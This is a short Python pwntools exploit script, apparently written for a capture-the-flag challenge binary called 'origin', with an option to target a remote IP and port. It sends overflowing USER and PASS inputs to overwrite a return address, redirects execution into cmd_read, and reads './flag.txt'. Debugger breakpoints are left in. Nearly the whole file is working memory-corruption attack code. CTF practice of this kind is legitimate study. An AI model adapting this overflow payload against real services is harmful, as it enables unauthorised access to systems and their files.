#!/usr/bin/env python3
import pwn

exe = pwn.ELF("./origin")
# pwn.context.log_level='debug'
pwn.context.terminal = ["foot"]
if pwn.args.REMOTE:
    p = pwn.remote("83.136.248.205", 43375)
else:
    p = pwn.process(exe.path)
    # p = pwn.gdb.debug([exe.path],"""
    # b*0x0000000000401696
    # b*cmd_login+313
    # b*cmd_login+141
    # c
    # b*cmd_read+118
    #
    #
    #                 """)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

back_main = 0x000000000040160d
if __name__ == "__main__":
    # p = conn()
    # for i in range()
    payload = b"\x00\0\0\0"
    s(payload)
    pwn.gdb.attach(p,gdbscript="""
    b*cmd_login+497
                   """)
    pay = b"a"*11+ pwn.p64(exe.sym.cmd_read + 87) 
    payload = b"USER " + b"a"*17 + b"\x1c" + pay
    input()
    s(payload)
    payload = b"PASS " + b"a"*507
    input()
    s(payload)
    payload = b"./flag.txt\0"
    s(payload)
    # input()
    # payload = b"./flag.txt\0"
    # s(payload)






    # good luck pwning :)
    p.interactive()
